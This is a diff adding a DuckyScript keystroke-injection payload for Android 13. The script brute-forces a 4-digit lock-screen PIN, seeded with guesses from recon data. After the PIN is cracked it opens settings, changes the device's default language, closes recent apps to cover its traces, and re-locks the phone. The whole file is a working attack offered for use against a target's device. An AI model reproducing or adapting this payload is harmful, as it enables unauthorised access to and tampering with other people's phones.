@@ -1,0 +1,126 @@
+REM #TITLE: Android 13 Payload
+REM #AUTHOR: $@LVAT10N!
+REM #DESCRIPTION: Android payload to support android 13. This payload will 
+REM # brute force a pin and change the default language on the target device 
+REM # Once the pin is cracked click the ducky button once to start the payload
+
+BUTTON_DEF
+ATTACKMODE HID 
+DELAY 2000
+REM # Navigate to home screen
+GUI ENTER
+DELAY 2000
+REM # move to settings menu
+GUI z
+DELAY 1000
+REM Search for general management
+ENTER
+DELAY 1000
+STRING general management
+DELAY 1000
+REM # Select general management
+
+VAR $FIND = 4
+WHILE ( $FIND > 0 )
+    TAB
+    DELAY 200
+    $FIND = ( $FIND - 1 )
+END_WHILE
+
+ENTER
+DELAY 1000
+REM # Select language
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+ENTER
+REM # Select "ADD language"
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+ENTER
+DELAY 1000
+REM # Select language To change to
+VAR $CHANGE = 5
+WHILE ( $CHANGE > 0 )
+    DOWNARROW
+    DELAY 200
+    $CHANGE = ( $CHANGE - 1 )
+END_WHILE
+
+DELAY 200
+ENTER
+REM # Set as default
+DELAY 200
+ENTER
+DELAY 200
+REM # Go home
+GUI ENTER
+DELAY 1000
+REM # Delete all recent tabs that were opened on the device
+
+VAR $WIPE = 8
+WHILE ( $WIPE > 0 )
+    ALT TAB
+    DELAY 100
+    ALT F4
+    DELAY 100
+    $WIPE = ( $WIPE - 1 )
+END_WHILE
+REM # If not already at the home screen, going to home screen
+DELAY 1000
+GUI ENTER
+REM # Locking the device back up
+DELAY 1000
+GUI l
+DELAY 100
+REM # Turning attackmode off
+ATTACKMODE OFF
+DELAY 1000
+END_BUTTON
+
+DELAY 3000
+REM # Scroll up, wake screen and start cracking
+REM # The first five strings you can add possible pins gathered from recon 
+REM # data by replacing the x's with pins or delete these lines, this 
+REM # payload is for a 4 digit pin. The pin length can be modified by X string
+REM # length and adding addtional "RANDOM_NUMBER" entries below to increase
+REM # the length of the random pins that are generated.
+ATTACKMODE HID
+DELAY 100
+SPACE
+DELAY 100
+SPACE
+DELAY 1000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 32000
